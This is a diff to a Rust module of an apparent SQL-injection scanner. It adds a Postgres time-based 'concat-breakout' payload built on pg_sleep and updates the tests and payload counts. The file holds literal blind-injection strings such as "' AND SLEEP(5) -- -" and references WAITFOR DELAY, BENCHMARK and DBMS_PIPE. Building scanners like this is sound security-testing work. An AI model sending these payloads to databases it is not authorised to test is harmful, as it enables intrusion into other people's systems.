@@ -43,7 +43,8 @@ pub fn time_payload_for(dbms: Option<&str>, secs: u64) -> TimePayload {
 /// conditional/alternate variants.
 ///
 /// - MySQL: `SLEEP` (legacy), `IF(1=1,SLEEP,0)` conditional, `BENCHMARK` fallback.
-/// - Postgres: `pg_sleep` (legacy), `CASE WHEN ... THEN pg_sleep` conditional.
+/// - Postgres: `pg_sleep` (legacy), `CASE WHEN ... THEN pg_sleep` conditional,
+///   `||(SELECT 1 FROM (SELECT pg_sleep..)x)||` inline concat-breakout.
 /// - MSSQL: `WAITFOR DELAY` (legacy, via shared `waitfor_delay_literal`),
 ///   `IF(1=1) WAITFOR` conditional.
 /// - Oracle: `DBMS_PIPE.RECEIVE_MESSAGE` (legacy), `DBMS_LOCK.SLEEP` alternate.
@@ -69,6 +70,11 @@ pub fn time_payloads_for(dbms: Option<&str>, secs: u64) -> Vec<TimePayload> {
             ),
             TimePayload::new(
                 crate::dbms::postgres::payloads::pg_time_conditional(secs),
+                secs,
+                tag.clone(),
+            ),
+            TimePayload::new(
+                crate::dbms::postgres::payloads::pg_time_concat(secs),
                 secs,
                 tag.clone(),
             ),
@@ -108,7 +114,7 @@ pub fn time_payloads_for(dbms: Option<&str>, secs: u64) -> Vec<TimePayload> {
 pub fn all_time_payloads(secs: u64) -> Vec<TimePayload> {
     assert!(secs >= 1, "sleep_secs must be >= 1");
     let mut legacies = Vec::with_capacity(4);
-    let mut variants = Vec::with_capacity(5);
+    let mut variants = Vec::with_capacity(6);
     for dbms in ["mysql", "postgres", "mssql", "oracle"] {
         let mut v = time_payloads_for(Some(dbms), secs);
         if !v.is_empty() {
@@ -205,9 +211,16 @@ mod tests {
     #[test]
     fn postgres_has_case_variant() {
         let v = time_payloads_for(Some("postgres"), 5);
-        assert_eq!(v.len(), 2);
+        assert_eq!(v.len(), 3);
         assert!(v[1].payload.contains("CASE WHEN"), "{}", v[1].payload);
         assert!(v[1].payload.contains("pg_sleep(5)"), "{}", v[1].payload);
+        assert!(v[2].payload.contains("||"), "{}", v[2].payload);
+        assert!(v[2].payload.contains("pg_sleep(5)"), "{}", v[2].payload);
+        assert!(
+            v[2].payload.contains("SELECT 1 FROM (SELECT pg_sleep"),
+            "{}",
+            v[2].payload
+        );
     }
 
     #[test]
@@ -232,12 +245,16 @@ mod tests {
     #[test]
     fn all_payloads_start_with_legacies() {
         let all = all_time_payloads(5);
-        assert_eq!(all.len(), 9);
+        assert_eq!(all.len(), 10);
         assert_eq!(all[0].payload, "' AND SLEEP(5) -- -");
         assert!(all[1].payload.contains("pg_sleep(5)"));
         assert!(all[2].payload.contains("WAITFOR DELAY"));
         assert!(all[3].payload.contains("DBMS_PIPE"));
         // Variants come after the four legacies.
         assert!(all[4..].iter().any(|p| p.payload.contains("BENCHMARK")));
+        assert!(
+            all[4..].iter().any(|p| p.payload.contains("||")
+                && p.payload.contains("SELECT 1 FROM (SELECT pg_sleep"))
+        );
     }
 }
